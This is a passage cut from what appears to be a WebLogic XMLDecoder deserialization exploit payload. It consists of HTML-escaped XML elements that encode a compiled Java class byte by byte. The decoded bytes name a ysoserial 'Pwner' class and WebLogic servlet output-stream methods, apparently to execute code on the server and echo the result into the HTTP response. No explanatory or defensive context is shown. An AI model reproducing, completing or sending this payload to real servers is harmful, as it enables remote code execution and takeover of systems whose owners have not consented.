index="5144"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5145"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5147"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5149"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5150"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5152"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5154"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5155"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5157"&gt;&lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="5158"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="5159"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5160"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="5161"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5162"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5163"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5164"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5165"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5166"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5167"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5168"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5169"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5170"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5171"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5172"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5173"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5174"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5175"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5176"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5177"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5178"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="5179"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5181"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5183"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="5184"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5186"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5188"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="5189"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5191"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5192"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5193"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5194"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5195"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5196"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5197"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5198"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5199"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="5200"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5201"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5202"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5203"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5204"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5205"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5206"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5207"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5208"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5209"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5210"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5211"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5212"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5213"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5214"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5215"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5216"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5217"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5218"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5219"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5220"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5221"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5222"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5223"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5224"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5225"&gt;&lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5226"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5227"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5228"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5229"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5230"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5231"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5232"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5233"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5234"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5235"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5236"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5237"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5238"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5239"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5240"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5241"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5243"&gt;&lt;byte&gt;123&lt;/byte&gt;&lt;/void&gt;&lt;void index="5244"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5246"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5247"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5248"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5249"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5250"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5251"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5252"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5253"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5254"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5255"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5256"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5257"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5258"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5260"&gt;&lt;byte&gt;24&lt;/byte&gt;&lt;/void&gt;&lt;void index="5261"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="5262"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5263"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="5264"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5265"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5266"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5267"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5268"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5269"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5270"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5271"&gt;&lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5272"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5273"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5274"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5275"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5276"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5277"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5278"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5279"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5280"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5281"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5282"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5283"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5284"&gt;&lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="5285"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5287"&gt;&lt;byte&gt;125&lt;/byte&gt;&lt;/void&gt;&lt;void index="5289"&gt;&lt;byte&gt;126&lt;/byte&gt;&lt;/void&gt;&lt;void index="5290"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5292"&gt;&lt;byte&gt;124&lt;/byte&gt;&lt;/void&gt;&lt;void index="5294"&gt;&lt;byte&gt;127&lt;/byte&gt;&lt;/void&gt;&lt;void index="5295"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5297"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5298"&gt;&lt;byte&gt;102&lt;/byte&gt;&lt;/void&gt;&lt;void index="5299"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5300"&gt;&lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5301"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5302"&gt;&lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="5303"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5305"&gt;&lt;byte&gt;-127&lt;/byte&gt;&lt;/void&gt;&lt;void index="5307"&gt;&lt;byte&gt;11&lt;/byte&gt;&lt;/void&gt;&lt;void index="5308"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5310"&gt;&lt;byte&gt;124&lt;/byte&gt;&lt;/void&gt;&lt;void index="5312"&gt;&lt;byte&gt;-126&lt;/byte&gt;&lt;/void&gt;&lt;void index="5313"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5315"&gt;&lt;byte&gt;9&lt;/byte&gt;&lt;/void&gt;&lt;void index="5316"&gt;&lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5317"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5318"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5319"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="5320"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5321"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5322"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5323"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5324"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5325"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5327"&gt;&lt;byte&gt;23&lt;/byte&gt;&lt;/void&gt;&lt;void index="5328"&gt;&lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="5329"&gt;&lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5330"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5331"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="5332"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5333"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5334"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5335"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5336"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5337"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5338"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5339"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="5340"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5341"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5342"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5343"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5344"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="5345"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5346"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5347"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5348"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5349"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5350"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5351"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5353"&gt;&lt;byte&gt;-124&lt;/byte&gt;&lt;/void&gt;&lt;void index="5355"&gt;&lt;byte&gt;-123&lt;/byte&gt;&lt;/void&gt;&lt;void index="5356"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5358"&gt;&lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5360"&gt;&lt;byte&gt;-122&lt;/byte&gt;&lt;/void&gt;&lt;void index="5361"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5364"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5366"&gt;&lt;byte&gt;-120&lt;/byte&gt;&lt;/void&gt;&lt;void index="5367"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5369"&gt;&lt;byte&gt;19&lt;/byte&gt;&lt;/void&gt;&lt;void index="5370"&gt;&lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="5371"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5372"&gt;&lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5373"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5374"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5375"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5376"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5377"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5378"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="5379"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5380"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5381"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5382"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5383"&gt;&lt;byte&gt;87&lt;/byte&gt;&lt;/void&gt;&lt;void index="5384"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5385"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5386"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5387"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5388"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5389"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5391"&gt;&lt;byte&gt;-118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5392"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5394"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5395"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5396"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5397"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5398"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5399"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5400"&gt;&lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5402"&gt;&lt;byte&gt;-116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5404"&gt;&lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="5405"&gt;&lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5407"&gt;&lt;byte&gt;-117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5409"&gt;&lt;byte&gt;-115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5410"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5412"&gt;&lt;byte&gt;13&lt;/byte&gt;&lt;/void&gt;&lt;void index="5413"&gt;&lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5414"&gt;&lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5415"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5416"&gt;&lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="5417"&gt;&lt;byte&gt;107&lt;/byte&gt;&lt;/void&gt;&lt;void index="5418"&gt;&lt;byte&gt;77&lt;/byte&gt;&lt;/void&gt;&lt;void index="5419"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5420"&gt;&lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5421"&gt;&lt;byte&gt;84&lt;/byte&gt;&lt;/void&gt;&lt;void index="5422"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5423"&gt;&lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5424"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5425"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5426"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5428"&gt;&lt;byte&gt;31&lt;/byte&gt;&lt;/void&gt;&lt;void index="5429"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="5430"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5431"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5432"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5433"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5434"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5435"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5436"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5437"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5438"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5439"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="5440"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5441"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5442"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5443"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5444"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5445"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="5446"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5447"&gt;&lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="5448"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5449"&gt;&lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="5450"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5451"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="5452"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="5453"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="5454"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5455"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="5456"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="5457"&gt;&lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="5458"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="5459"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5460"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5462"&gt;&lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="5463"&gt;&lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5464"&gt;&lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="5465"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5466"&gt;&lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5467"&gt;&lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5468"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5469"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5470"&gt;&lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5471"&gt;&lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5472"&gt;&lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5473"&gt;&lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5474"&gt;&lt;byte&gt;80&lt;/byte&gt;&lt;/void&gt;&lt;void index="5475"&gt;&lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5476"&gt;&lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5477"&gt;&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5478"&gt;&lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5479"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5480"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="5481"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5482"&gt;&lt;byte&gt;56&lt;/byte&gt;&lt;/void&gt;&lt;void index="5483"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5484"&gt;&lt;byte&gt;51&lt;/byte&gt;&lt;/void&gt;&lt;void index="5485"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5486"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="5487"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="5488"&gt;&lt;byte&gt;50&lt;/byte&gt;&lt;/void&gt;&lt;void index="5489"&gt;&lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5490"&gt;&lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="5491"&gt;&lt;byte&gt;52&lt;/byte&gt;&lt;/void&gt;&lt;void index="5492"&gt;&lt;byte&gt;54&lt;/byte&gt;&lt;/void&gt;&lt;void index="5493"&gt;&lt;byte&gt;48&lt;/byte&gt;&lt;/void&gt;&lt;void index="5494"&gt;&lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5495"&gt;&lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5497"&gt;&lt;byte&gt;33&lt;/byte&gt;&lt;/void&gt;&lt;void index="5499"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5501"&gt;&lt;byte&gt;3&lt;/byte&gt;&lt;/void&gt;&lt;void index="5503"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5505"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void index="5507"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5509"&gt;&lt;byte&gt;26&lt;/byte&gt;&lt;/void&gt;&lt;void index="5511"&gt;&lt;byte&gt;5&lt;/byte&gt;&lt;/void&gt;&lt;void index="5513"&gt;&lt;byte&gt;6&lt;/byte&gt;&lt;/void&gt;&lt;void index="5515"&gt;&lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5517"&gt;&lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5521"&gt;&lt;byte&gt;2&lt;/byte&gt;&lt;/void&gt;&lt;void index="5523"&gt;&lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5525"&gt;&lt;byte&gt;4&lt;/byte&gt;&lt;/void&gt;&lt;void 